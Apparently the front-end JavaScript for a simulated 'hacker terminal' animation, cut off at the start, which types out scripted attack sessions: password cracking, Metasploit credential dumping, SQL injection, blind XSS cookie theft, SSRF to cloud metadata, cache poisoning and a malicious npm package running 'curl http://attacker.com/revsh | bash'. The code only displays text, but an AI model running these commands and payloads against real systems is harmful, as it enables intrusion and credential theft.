    { text: "hashcat (v6.2.6) starting...", type: "output", delay: 600 },
    { text: "OpenCL API (OpenCL 3.0 CUDA 12.2.147) - Platform #1 [NVIDIA Corporation]", type: "info", delay: 400 },
    { text: "=======================================================================", type: "output", delay: 100 },
    { text: "* Device #1: NVIDIA GeForce RTX 4090, 24000/24564 MB (6141 MB allocatable), 128MCU", type: "success", delay: 500 },
    { text: "Minimum password length supported by kernel: 0", type: "info", delay: 200 },
    { text: "Maximum password length supported by kernel: 256", type: "info", delay: 200 },
    { text: "Hashes: 1 digests; 1 unique digests, 1 unique salts", type: "info", delay: 300 },
    { text: "Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates", type: "info", delay: 200 },
    { text: "Rules: 77", type: "info", delay: 200 },
    { text: "Dictionary cache hit:", type: "success", delay: 400 },
    { text: "* Filename..: rockyou.txt", type: "output", delay: 100 },
    { text: "* Passwords.: 14344385", type: "output", delay: 100 },
    { text: "* Bytes.....: 139921507", type: "output", delay: 100 },
    { text: "* Keyspace..: 1104517645", type: "output", delay: 100 },
    { text: "Approaching final keyspace - workload is adjusted to save energy.", type: "warning", delay: 1000 },
    { text: "Cracking in progress... [0.00%]", type: "output", delay: 800 },
    { text: "Cracking in progress... [12.45%]", type: "output", delay: 800 },
    { text: "Cracking in progress... [38.12%]", type: "output", delay: 800 },
    { text: "Cracking in progress... [64.88%]", type: "output", delay: 800 },
    { text: "5f4dcc3b5aa765d61d8327deb882cf99:Admin@123", type: "success", delay: 500 },
    { text: "Session..........: hashcat", type: "info", delay: 200 },
    { text: "Status...........: Cracked", type: "success", delay: 200 },
    { text: "Hash.Mode........: 0 (MD5)", type: "info", delay: 200 },
    { text: "Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99", type: "info", delay: 200 },
    { text: "Time.Started.....: Wed Jun 17 14:00:00 2026 (4 secs)", type: "info", delay: 200 },
    { text: "Time.Estimated...: Wed Jun 17 14:00:04 2026 (0 secs)", type: "info", delay: 200 },
    { text: "Kernel.Feature...: Pure Kernel", type: "info", delay: 200 },
    { text: "Guess.Base.......: File (rockyou.txt)", type: "info", delay: 200 },
    { text: "Guess.Mod........: Rules (rules/best64.rule)", type: "info", delay: 200 },
    { text: "Speed.#1.........: 145.2 MH/s (3.44ms) @ Accel:512 Loops:77 Thr:256 Vec:8", type: "success", delay: 200 },
    { text: "Recovered........: 1/1 (100.00%) Digests", type: "success", delay: 200 },
    { text: "Progress.........: 61858564/1104517645 (5.60%)", type: "info", delay: 200 },
    { text: "Rejected.........: 0/61858564 (0.00%)", type: "info", delay: 200 },
    { text: "Restore.Point....: 486400/14344385 (3.39%)", type: "info", delay: 200 },
    { text: "Started: Wed Jun 17 14:00:00 2026", type: "info", delay: 200 },
    { text: "Stopped: Wed Jun 17 14:00:05 2026", type: "info", delay: 200 }
  ],

  apt: [
    { text: `root@kali:~# msfconsole -q`, type: "cmd", delay: 800 },
    { text: `msf6 > use exploit/multi/handler`, type: "cmd", delay: 500 },
    { text: `msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp`, type: "cmd", delay: 600 },
    { text: `PAYLOAD => windows/x64/meterpreter/reverse_tcp`, delay: 200 },
    { text: `msf6 exploit(multi/handler) > exploit -j`, type: "cmd", delay: 400 },
    { text: `[*] Exploit running as background job 0.`, delay: 300 },
    { text: `[*] Started reverse TCP handler on 10.0.0.5:4444`, delay: 1000 },
    { text: `[*] Sending stage (200262 bytes) to 10.0.0.102`, delay: 500 },
    { text: `[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.102:49156)`, type: "cmd", delay: 1200 },
    { text: `meterpreter > load kiwi`, type: "cmd", delay: 800 },
    { text: `Loading extension kiwi...Success.`, delay: 400 },
    { text: `meterpreter > creds_all`, type: "cmd", delay: 1000 },
    { text: `[+] Running as SYSTEM`, type: "cmd", delay: 300 },
    { text: `Retrieving all credentials...`, delay: 500 },
    { text: `Username    Domain   Password`, delay: 100 },
    { text: `--------    ------   --------`, delay: 100 },
    { text: `Administrator CORP     Winter2025!`, type: "err", delay: 500 },
    { text: `meterpreter > shell`, type: "cmd", delay: 700 },
    { text: `C:\\Windows\\system32> net use \\\\DC01\\C$ /user:CORP\\Administrator Winter2025!`, type: "cmd", delay: 1500 },
    { text: `The command completed successfully.`, delay: 400 },
    { text: `C:\\Windows\\system32> echo APT_OWNED > \\\\DC01\\C$\\owned.txt`, type: "cmd", delay: 800 },
    { text: `[!!!] DOMAIN CONTROLLER COMPROMISED [!!!]`, type: "err", delay: 1000 }
  ],
  nmap: [
    { text: `root@kali:~# nmap -p- -sC -sV --min-rate=1000 target.com`, type: "cmd", delay: 600 },
    { text: `Starting Nmap 7.93 ( https://nmap.org )`, delay: 300 },
    { text: `NSE: Loaded 155 scripts for scanning.`, delay: 100 },
    { text: `Initiating Ping Scan...`, delay: 200 },
    { text: `Initiating SYN Stealth Scan...`, delay: 400 },
    { text: `Discovered open port 80/tcp on 192.168.1.5`, delay: 200 },
    { text: `Discovered open port 443/tcp on 192.168.1.5`, delay: 100 },
    { text: `Discovered open port 22/tcp on 192.168.1.5`, delay: 150 },
    { text: `Discovered open port 3306/tcp on 192.168.1.5`, type: "warn", delay: 300 },
    { text: `Initiating Service scan...`, delay: 500 },
    { text: `PORT     STATE SERVICE  VERSION`, type: "cmd", delay: 100 },
    { text: `22/tcp   open  ssh      OpenSSH 8.2p1`, delay: 100 },
    { text: `80/tcp   open  http     nginx 1.18.0`, delay: 100 },
    { text: `443/tcp  open  ssl/http nginx 1.18.0`, delay: 100 },
    { text: `3306/tcp open  mysql    MySQL 5.7.33`, type: "err", delay: 500 },
    { text: `| mysql-info:`, type: "warn", delay: 200 },
    { text: `|   Protocol: 10`, type: "warn", delay: 100 },
    { text: `|   Version: 5.7.33`, type: "warn", delay: 100 },
    { text: `|_  Salt: ********************`, type: "warn", delay: 100 },
    { text: `[*] Nmap done: 1 IP address scanned in 12.4 seconds`, delay: 800 }
  ],
  ffuf: [
    { text: `root@kali:~# ffuf -u https://target.com/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403`, type: "cmd", delay: 500 },
    { text: `        /'___\  /'___\           /'___\       `, type: "warn", delay: 100 },
    { text: `       /\ \__/ /\ \__/  __  __  /\ \__/       `, type: "warn", delay: 100 },
    { text: `       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      `, type: "warn", delay: 100 },
    { text: `        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      `, type: "warn", delay: 100 },
    { text: `         \ \_\   \ \_\  \ \____/  \ \_\       `, type: "warn", delay: 100 },
    { text: `          \/_/    \/_/   \/___/    \/_/       `, type: "warn", delay: 100 },
    { text: `       v2.0.0-dev`, type: "warn", delay: 400 },
    { text: `________________________________________________`, delay: 200 },
    { text: ` :: Method           : GET`, delay: 100 },
    { text: ` :: URL              : https://target.com/FUZZ`, delay: 100 },
    { text: ` :: Wordlist         : FUZZ: raft-medium-directories.txt`, delay: 100 },
    { text: `________________________________________________`, delay: 400 },
    { text: `admin                   [Status: 403, Size: 153, Words: 12, Lines: 5, Duration: 42ms]`, type: "err", delay: 600 },
    { text: `api                     [Status: 200, Size: 3123, Words: 412, Lines: 12, Duration: 39ms]`, delay: 200 },
    { text: `login                   [Status: 200, Size: 1843, Words: 212, Lines: 45, Duration: 40ms]`, delay: 300 },
    { text: `.git/config             [Status: 200, Size: 112, Words: 15, Lines: 10, Duration: 45ms]`, type: "err", delay: 800 },
    { text: `backup.zip              [Status: 200, Size: 1542312, Words: 0, Lines: 0, Duration: 120ms]`, type: "err", delay: 500 },
    { text: `:: Progress: [30000/30000] :: Job [1/1] :: 1200 req/sec :: Duration: [0:00:25] ::`, delay: 600 }
  ],
  sqlmap: [
    { text: `root@kali:~# sqlmap -u "https://target.com/product?id=1" --dbs --batch --random-agent`, type: "cmd", delay: 500 },
    { text: `        ___`, type: "warn", delay: 100 },
    { text: `       __H__`, type: "warn", delay: 100 },
    { text: ` ___ ___[,]_____ ___ ___  {1.6.4#stable}`, type: "warn", delay: 100 },
    { text: `|_ -| . [']     | .'| . |`, type: "warn", delay: 100 },
    { text: `|___|_  [.]_|_|_|__,|  _|`, type: "warn", delay: 100 },
    { text: `      |_|V...       |_|   https://sqlmap.org`, type: "warn", delay: 400 },
    { text: `[*] starting @ 10:45:12`, delay: 200 },
    { text: `[10:45:13] [INFO] testing connection to the target URL`, delay: 300 },
    { text: `[10:45:14] [INFO] checking if the target is protected by some kind of WAF/IPS`, delay: 400 },
    { text: `[10:45:15] [INFO] testing if GET parameter 'id' is dynamic`, delay: 500 },
    { text: `[10:45:16] [WARNING] heuristic (basic) test shows that GET parameter 'id' might be injectable`, type: "warn", delay: 600 },
    { text: `[10:45:17] [INFO] testing for SQL injection on GET parameter 'id'`, delay: 400 },
    { text: `[10:45:19] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable`, type: "err", delay: 1200 },
    { text: `[10:45:20] [INFO] the back-end DBMS is MySQL`, delay: 200 },
    { text: `web server operating system: Linux Ubuntu`, delay: 100 },
    { text: `web application technology: Nginx 1.18.0, PHP 7.4.3`, delay: 100 },
    { text: `back-end DBMS: MySQL >= 5.0.12`, delay: 300 },
    { text: `[10:45:22] [INFO] fetching database names`, delay: 400 },
    { text: `available databases [3]:`, type: "cmd", delay: 500 },
    { text: `[*] information_schema`, delay: 100 },
    { text: `[*] target_store_db`, type: "err", delay: 100 },
    { text: `[*] mysql`, delay: 100 },
    { text: `root@kali:~# sqlmap -u "https://target.com/product?id=1" -D target_store_db -T users --dump`, type: "cmd", delay: 1500 },
    { text: `[10:45:30] [INFO] fetching entries for table 'users'`, delay: 500 },
    { text: `Database: target_store_db
Table: users
[2 entries]`, type: "cmd", delay: 400 },
    { text: `+----+-------------+----------------------------------+`, type: "warn", delay: 100 },
    { text: `| id | username    | password_hash                    |`, type: "warn", delay: 100 },
    { text: `+----+-------------+----------------------------------+`, type: "warn", delay: 100 },
    { text: `| 1  | admin       | 5f4dcc3b5aa765d61d8327deb882cf99 |`, type: "err", delay: 200 },
    { text: `| 2  | jsmith      | 12b1d3d65aa765d61d8327deb88223d1 |`, type: "err", delay: 200 },
    { text: `+----+-------------+----------------------------------+`, type: "warn", delay: 100 }
  ],
  xss: [
    { text: `root@kali:~# dalfox url https://target.com/search?q=test -b https://bxsshunter.com/xss`, type: "cmd", delay: 500 },
    { text: `    _..._      DALFOX`, type: "warn", delay: 100 },
    { text: `  .'     '.    Parameter Analysis and XSS Scanner`, type: "warn", delay: 100 },
    { text: ` /  _   _  \   Based on Golang`, type: "warn", delay: 100 },
    { text: ` | (o)_(o) |   `, type: "warn", delay: 100 },
    { text: ` \  .-.-.  /   `, type: "warn", delay: 100 },
    { text: `  '. \_/ .'    `, type: "warn", delay: 400 },
    { text: `[*] Target: https://target.com/search?q=test`, delay: 200 },
    { text: `[*] BAV: https://bxsshunter.com/xss`, delay: 200 },
    { text: `[*] Method: GET`, delay: 100 },
    { text: `[*] Worker: 100`, delay: 100 },
    { text: `[I] Start XSS Scanning..`, delay: 500 },
    { text: `[I] Check param: q`, delay: 300 },
    { text: `[V] Reflected Payload: '><script>alert(1)</script>`, type: "err", delay: 600 },
    { text: `[V] Triggered XSS payload [q] = '"><svg/onload=alert(1)>`, type: "err", delay: 500 },
    { text: `[I] Injecting Blind XSS Payloads...`, delay: 800 },
    { text: `[V] Triggered Blind XSS payload [q] = '"><script src=https://bxsshunter.com/xss></script>`, type: "err", delay: 600 },
    { text: `==================================================`, delay: 100 },
    { text: `[WAITING] Listening for Blind XSS Callbacks on bxsshunter.com...`, type: "cmd", delay: 1500 },
    { text: `[ALERT] BLIND XSS FIRED!`, type: "err", delay: 2000 },
    { text: `Execution Time: 2026-06-17 14:30:22`, type: "err", delay: 100 },
    { text: `URL: https://target.com/admin/dashboard`, type: "err", delay: 100 },
    { text: `IP: 192.168.1.100`, type: "err", delay: 100 },
    { text: `Cookies: session_id=s3cr3t_4dm1n_t0k3n_12345; __Secure-Auth=true`, type: "err", delay: 200 }
  ],
  darkweb: [
    { text: `root@kali:~# tor --RunAsDaemon 1`, type: "cmd", delay: 500 },
    { text: `Starting Tor 0.4.7.13...`, delay: 400 },
    { text: `Bootstrapped 100% (done): Done`, delay: 600 },
    { text: `root@kali:~# python3 scrape_ransomware_blogs.py --target "Corp Inc"`, type: "cmd", delay: 800 },
    { text: `[*] Connecting to Tor Proxy at 127.0.0.1:9050...`, delay: 400 },
    { text: `[*] Connected. Your IP is 194.22.x.x (Exit Node)`, delay: 300 },
    { text: `[*] Checking LockBit 3.0 Onion Site...`, delay: 1200 },
    { text: `[!] Target 'Corp Inc' NOT found on LockBit.`, delay: 400 },
    { text: `[*] Checking BlackBasta Onion Site...`, delay: 1500 },
    { text: `[!!!] TARGET MATCH FOUND: Corp Inc`, type: "err", delay: 800 },
    { text: `    -> 250GB Data Leaked.`, type: "err", delay: 200 },
    { text: `    -> Status: PUBLISHED.`, type: "err", delay: 200 },
    { text: `    -> Price: FREE DOWNLOAD.`, type: "err", delay: 200 },
    { text: `[*] Fetching file tree from leak directory...`, delay: 900 },
    { text: `FOUND: /IT_Backups/aws_credentials.txt`, type: "warn", delay: 400 },
    { text: `FOUND: /HR/employee_passwords.xlsx`, type: "warn", delay: 300 },
    { text: `FOUND: /DevOps/source_code.zip`, type: "warn", delay: 200 },
    { text: `root@kali:~# cat /tmp/aws_credentials.txt`, type: "cmd", delay: 1500 },
    { text: `aws_access_key_id=AKIAIOSFODNN7EXAMPLE`, type: "err", delay: 100 },
    { text: `aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`, type: "err", delay: 100 }
  ],
  recon: [
    { text: `root@kali:~# subfinder -d target.com -all -silent | tee subs.txt`, type: "cmd", delay: 500 },
    { text: `               __    _____           __         `, type: "warn", delay: 100 },
    { text: `   ________  _/ /_  / __(_)___  ____/ /__  _____`, type: "warn", delay: 100 },
    { text: `  / ___/ / / / __ \/ /_/ / __ \/ __  / _ \/ ___/`, type: "warn", delay: 100 },
    { text: ` (__  ) /_/ / /_/ / __/ / / / / /_/ /  __/ /    `, type: "warn", delay: 100 },
    { text: `/____/\__,_/_.___/_/ /_/_/ /_/\__,_/\___/_/     `, type: "warn", delay: 100 },
    { text: `ProjectDiscovery v2.6.4`, type: "warn", delay: 400 },
    { text: `[INF] Enumerating subdomains for target.com`, delay: 500 },
    { text: `www.target.com`, delay: 200 },
    { text: `api.target.com`, delay: 100 },
    { text: `mail.target.com`, delay: 100 },
    { text: `jira.target.com`, delay: 100 },
    { text: `root@kali:~# amass enum -passive -d target.com -silent >> subs.txt`, type: "cmd", delay: 1000 },
    { text: `Starting Amass Enumeration...`, delay: 500 },
    { text: `dev-admin.target.com`, type: "err", delay: 1500 },
    { text: `internal-api-v2.target.com`, type: "err", delay: 200 },
    { text: `internal-vpn.target.com`, type: "err", delay: 200 },
    { text: `root@kali:~# cat subs.txt | sort -u | httpx -silent -title -tech-detect -status-code | tee alive.txt`, type: "cmd", delay: 1200 },
    { text: `    __    __  __       _  __`, type: "warn", delay: 100 },
    { text: `   / /_  / /_/ /_____ | |/ /`, type: "warn", delay: 100 },
    { text: `  / __ \/ __/ __/ __ \|   / `, type: "warn", delay: 100 },
    { text: ` / / / / /_/ /_/ /_/ /   |  `, type: "warn", delay: 100 },
    { text: `/_/ /_/\__/\__/ .___/_/|_|  `, type: "warn", delay: 100 },
    { text: `             /_/            `, type: "warn", delay: 100 },
    { text: `https://api.target.com [200] [JSON API] [Nginx, Node.js]`, delay: 400 },
    { text: `https://jira.target.com [200] [Jira Login] [Atlassian Jira]`, delay: 200 },
    { text: `https://dev-admin.target.com [403] [Forbidden] [Nginx]`, type: "warn", delay: 200 },
    { text: `https://internal-api-v2.target.com [200] [Swagger UI] [Express]`, type: "err", delay: 300 },
    { text: `https://internal-vpn.target.com [200] [GlobalProtect Portal] [Palo Alto]`, type: "err", delay: 200 },
    { text: `root@kali:~# nuclei -l alive.txt -t cves/ -t exposed-panels/ -t misconfiguration/ -severity critical,high`, type: "cmd", delay: 1500 },
    { text: `                     __     _`, type: "warn", delay: 100 },
    { text: `   ____  __  _______/ /__  (_)`, type: "warn", delay: 100 },
    { text: `  / __ \/ / / / ___/ / _ \/ / `, type: "warn", delay: 100 },
    { text: ` / / / / /_/ / /__/ /  __/ /  `, type: "warn", delay: 100 },
    { text: `/_/ /_/\__,_/\___/_/\___/_/   `, type: "warn", delay: 100 },
    { text: `[*] Loaded 2415 templates...`, delay: 400 },
    { text: `[swagger-api] [info] [http] https://internal-api-v2.target.com/api-docs`, type: "warn", delay: 800 },
    { text: `[paloalto-globalprotect-portal] [info] [http] https://internal-vpn.target.com/`, type: "warn", delay: 500 },
    { text: `[CVE-2024-3400] [critical] [http] https://internal-vpn.target.com/ => PAN-OS Command Injection`, type: "err", delay: 1200 },
    { text: `[jira-cve-2022-26134] [critical] [http] https://jira.target.com/ => Atlassian Jira OGNL RCE`, type: "err", delay: 600 },
    { text: `[!!!] CRITICAL VULNERABILITIES FOUND DURING RECON [!!!]`, type: "err", delay: 800 }
  ],
  api: [
    { text: `root@kali:~# kr scan https://api.target.com -w routes-large.kite`, type: "cmd", delay: 600 },
    { text: `    _  ___ __`, type: "warn", delay: 100 },
    { text: `   / |/ (_) /____  _______  ______  ____  ___  _____`, type: "warn", delay: 100 },
    { text: `  /    / / __/ _ \/ ___/ / / / __ \/ __ \/ _ \/ ___/`, type: "warn", delay: 100 },
    { text: ` / /| / / /_/  __/ /  / /_/ / / / / / / /  __/ /    `, type: "warn", delay: 100 },
    { text: `/_/ |_/_/\__/\___/_/   \__,_/_/ /_/_/ /_/\___/_/     `, type: "warn", delay: 100 },
    { text: `v1.0.2 - Assetnote`, type: "warn", delay: 300 },
    { text: `[*] Loaded 124,103 routes from kite file.`, delay: 400 },
    { text: `[*] Starting scan...`, delay: 200 },
    { text: `GET     401 [41B] https://api.target.com/v1/users`, delay: 300 },
    { text: `POST    401 [41B] https://api.target.com/v1/users`, delay: 100 },
    { text: `GET     200 [1.2KB] https://api.target.com/v1/health`, delay: 400 },
    { text: `POST    403 [112B] https://api.target.com/v2/admin`, type: "err", delay: 600 },
    { text: `POST    200 [512B] https://api.target.com/v2/admin/debug`, type: "err", delay: 500 },
    { text: `root@kali:~# curl -X POST https://api.target.com/v2/admin/debug`, type: "cmd", delay: 1000 },
    { text: `{"status":"success", "debug_token":"sys_admin_9918237192837"}`, type: "err", delay: 800 }
  ],
  ssrf: [
    { text: `root@kali:~# curl -v "https://target.com/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`, type: "cmd", delay: 600 },
    { text: `*   Trying 192.168.1.100:443...`, delay: 100 },
    { text: `* Connected to target.com (192.168.1.100) port 443 (#0)`, delay: 200 },
    { text: `> GET /webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1`, delay: 100 },
    { text: `> Host: target.com`, delay: 100 },
    { text: `> Accept: */*`, delay: 100 },
    { text: `< HTTP/1.1 200 OK`, delay: 600 },
    { text: `< Content-Type: text/plain`, delay: 100 },
    { text: `production-s3-access-role`, type: "err", delay: 300 },
    { text: `root@kali:~# curl "https://target.com/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/production-s3-access-role"`, type: "cmd", delay: 1200 },
    { text: `{`, type: "err", delay: 500 },
    { text: `  "Code" : "Success",`, type: "err", delay: 100 },
    { text: `  "AccessKeyId" : "ASIAX...",`, type: "err", delay: 100 },
    { text: `  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiC...",`, type: "err", delay: 100 },
    { text: `  "Token" : "IQoJb3JpZ2luX2VjEJv...",`, type: "err", delay: 100 },
    { text: `  "Expiration" : "2026-06-17T20:30:00Z"`, type: "err", delay: 100 },
    { text: `}`, type: "err", delay: 100 },
    { text: `[!!!] CLOUD ACCOUNT COMPROMISED [!!!]`, type: "err", delay: 800 }
  ],
  ssti: [
    { text: `root@kali:~# python3 tplmap.py -u "https://target.com/profile?name=John"`, type: "cmd", delay: 500 },
    { text: `[+] Tplmap 0.5`, type: "warn", delay: 200 },
    { text: `[+] Testing if parameter 'name' is injectable`, delay: 400 },
    { text: `[*] Smarty: testing...`, delay: 200 },
    { text: `[*] Jinja2: testing...`, delay: 200 },
    { text: `[+] Jinja2 plugin has confirmed injection with tag '{{*}}'`, type: "err", delay: 600 },
    { text: `[+] Tplmap identified the following injection point:`, delay: 200 },
    { text: `    GET parameter: name`, delay: 100 },
    { text: `    Engine: Jinja2`, delay: 100 },
    { text: `    Injection: {{%s}}`, delay: 100 },
    { text: `    OS: Linux`, delay: 100 },
    { text: `root@kali:~# python3 tplmap.py -u "https://target.com/profile?name=John" --os-shell`, type: "cmd", delay: 1000 },
    { text: `[+] Run commands on the operating system.`, delay: 500 },
    { text: `linux $ id`, type: "cmd", delay: 800 },
    { text: `uid=0(root) gid=0(root) groups=0(root)`, type: "err", delay: 400 },
    { text: `linux $ cat /etc/shadow`, type: "cmd", delay: 800 },
    { text: `root:$6$XYZ123$abc...:18750:0:99999:7:::`, type: "err", delay: 500 },
    { text: `linux $ `, type: "cmd", delay: 400 }
  ],
  race: [
    { text: `[*] Turbo Intruder: Loaded script race_condition.py`, type: "warn", delay: 500 },
    { text: `[*] Target: POST https://target.com/api/apply_coupon`, delay: 200 },
    { text: `[*] Payload: {"coupon_code": "WELCOME50"}`, delay: 200 },
    { text: `[*] Executing Single-Packet Attack (20 requests in 1 TCP packet)...`, delay: 600 },
    { text: `Req #1  -> Status: 200, Resp: {"success": true, "balance": 50}`, delay: 300 },
    { text: `Req #2  -> Status: 200, Resp: {"success": true, "balance": 100}`, type: "err", delay: 100 },
    { text: `Req #3  -> Status: 200, Resp: {"success": true, "balance": 150}`, type: "err", delay: 100 },
    { text: `Req #4  -> Status: 200, Resp: {"success": true, "balance": 200}`, type: "err", delay: 100 },
    { text: `... (15 requests later)`, delay: 400 },
    { text: `Req #20 -> Status: 200, Resp: {"success": true, "balance": 1000}`, type: "err", delay: 200 },
    { text: `[!!!] RACE CONDITION EXPLOITED: Balance multiplied by 20!`, type: "err", delay: 800 }
  ],
  cache: [
    { text: `root@kali:~# ruby paraminer.rb -u "https://target.com/"`, type: "cmd", delay: 500 },
    { text: `[*] Paraminer v1.2 initialized`, delay: 200 },
    { text: `[*] Bruteforcing HTTP headers...`, delay: 500 },
    { text: `[!] Found Unkeyed Header: X-Forwarded-Host`, type: "err", delay: 1200 },
    { text: `[*] Testing Cache Poisoning...`, delay: 800 },
    { text: `root@kali:~# curl -H "X-Forwarded-Host: evil.com" https://target.com/ -i`, type: "cmd", delay: 1000 },
    { text: `HTTP/1.1 200 OK`, delay: 400 },
    { text: `X-Cache: MISS`, delay: 100 },
    { text: `<html><script src="https://evil.com/app.js"></script></html>`, type: "err", delay: 300 },
    { text: `root@kali:~# curl https://target.com/ -i`, type: "cmd", delay: 800 },
    { text: `HTTP/1.1 200 OK`, delay: 400 },
    { text: `X-Cache: HIT`, type: "err", delay: 100 },
    { text: `<html><script src="https://evil.com/app.js"></script></html>`, type: "err", delay: 300 },
    { text: `[!!!] CACHE POISONED! All visitors will load evil.com/app.js!`, type: "err", delay: 600 }
  ],
  darkweb: [
    { text: `root@kali:~# proxychains4 -q torbrowser-launcher`, type: `cmd`, delay: 500 },
    { text: `[+] Tor network connected...`, delay: 400 },
    { text: `[+] Launching Ahmia Search Engine on Tor...`, delay: 600 },
    { text: `[INFO] Navigating to http://lockbitapt...onion`, delay: 800 },
    { text: `[!] ALERT: "TARGET CORPORATION" FOUND ON RANSOMWARE BLOG`, type: `err`, delay: 1200 },
    { text: `root@kali:~# proxychains4 -q wget -r -np http://lockbitapt...onion/target_leak/`, type: `cmd`, delay: 800 },
    { text: `Downloading: /target_leak/aws_keys.txt ... OK`, delay: 300 },
    { text: `Downloading: /target_leak/employees_passwords.csv ... OK`, delay: 300 },
    { text: `Downloading: /target_leak/network_topology.pdf ... OK`, delay: 300 },
    { text: `root@kali:~# cat aws_keys.txt`, type: `cmd`, delay: 600 },
    { text: `AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE`, type: `err`, delay: 100 },
    { text: `AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`, type: `err`, delay: 100 },
    { text: `[!!!] CRITICAL CLOUD INFRASTRUCTURE KEYS ACQUIRED [!!!]`, type: `err`, delay: 1000 }
  ],
  leaks: [
    { text: `root@kali:~# h8mail -t "admin@target.com" -c config.ini`, type: `cmd`, delay: 800 },
    { text: `[+] Initializing h8mail v2.5.6`, type: `warn`, delay: 300 },
    { text: `[+] Loading API Keys from config.ini... OK`, delay: 200 },
    { text: `[*] Querying DeHashed API...`, delay: 600 },
    { text: `[*] Querying Leak-Lookup API...`, delay: 500 },
    { text: `[*] Querying IntelligenceX...`, delay: 400 },
    { text: `------------------------------------------------------`, delay: 100 },
    { text: `[!] BREACH FOUND: Collection #1 (2019)`, type: `err`, delay: 800 },
    { text: `Email: admin@target.com`, delay: 100 },
    { text: `Cleartext Password: SuperSecretAdmin2019!`, type: `err`, delay: 100 },
    { text: `------------------------------------------------------`, delay: 100 },
    { text: `[!] BREACH FOUND: LinkedIn Data Leak (2021)`, type: `err`, delay: 600 },
    { text: `Email: admin@target.com`, delay: 100 },
    { text: `Cleartext Password: TargetCorp@2021!`, type: `err`, delay: 100 },
    { text: `------------------------------------------------------`, delay: 100 },
    { text: `[!!!] FATAL: VALID CLEARTEXT PASSWORDS RECOVERED.`, type: `err`, delay: 1000 },
    { text: `[!!!] PROCEEDING TO VPN/RDP INITIAL ACCESS.`, type: `err`, delay: 500 }
  ],
  supply: [
    { text: `root@kali:~# npm init -y`, type: "cmd", delay: 400 },
    { text: `Wrote to /tmp/target-internal-auth/package.json`, delay: 200 },
    { text: `root@kali:~# cat index.js`, type: "cmd", delay: 500 },
    { text: `const exec = require('child_process').exec;`, type: "warn", delay: 100 },
    { text: `exec('curl http://attacker.com/revsh | bash');`, type: "warn", delay: 100 },
    { text: `root@kali:~# npm publish`, type: "cmd", delay: 800 },
    { text: `+ target-internal-auth@99.9.9`, type: "err", delay: 1200 },
    { text: `[*] Malicious package published with ultra-high version.`, delay: 400 },
    { text: `==================================================`, delay: 100 },
    { text: `[WAITING] Listening for callbacks on attacker.com:443...`, type: "cmd", delay: 1500 },
    { text: `Connection received from 54.21.x.x (Target CI/CD Pipeline)`, type: "err", delay: 2500 },
    { text: `target-ci@jenkins:/app$ id`, type: "cmd", delay: 500 },
    { text: `uid=1001(target-ci) gid=1001(docker)`, type: "err", delay: 200 },
    { text: `[!!!] SUPPLY CHAIN COMPROMISED [!!!]`, type: "err", delay: 500 }
  ]
};

let currentTypingInterval = null;
let printLineTimeout = null;

function launchSimulation(scriptId) {
  const overlay = document.getElementById('terminal-overlay');
  const output = document.getElementById('terminal-output');
  if(!overlay || !output) return;
  
  const script = simulationScripts[scriptId];
  if(!script) {
     if (scriptId === 'apt' && !simulationScripts['apt']) return;
  }

  overlay.classList.add('active');
  output.innerHTML = '';
  
  if (currentTypingInterval) clearInterval(currentTypingInterval);
  if (printLineTimeout) clearTimeout(printLineTimeout);
  
  let i = 0;
  function printLine() {
    if(i >= script.length) return;
    const line = script[i];
    const p = document.createElement('div');
    if(line.type === 'cmd') p.className = 'term-cmd';
    else if(line.type === 'err') p.className = 'term-err';
    else if(line.type === 'warn') p.className = 'term-warn';
    else p.style.color = '#0f0';
    
    p.style.whiteSpace = 'pre-wrap';
    output.appendChild(p);
    
    let charIdx = 0;
    currentTypingInterval = setInterval(() => {
      p.textContent += line.text.charAt(charIdx);
      charIdx++;
      output.scrollTop = output.scrollHeight;
      if(charIdx >= line.text.length) {
        clearInterval(currentTypingInterval);
        i++;
        printLineTimeout = setTimeout(printLine, line.delay);
      }
    }, 12);
  }
  printLine();
}

function launchAPT() {
  launchSimulation('apt');
}

function closeTerminal() {
  document.getElementById('terminal-overlay').classList.remove('active');
  if (currentTypingInterval) clearInterval(currentTypingInterval);
  if (printLineTimeout) clearTimeout(printLineTimeout);
}
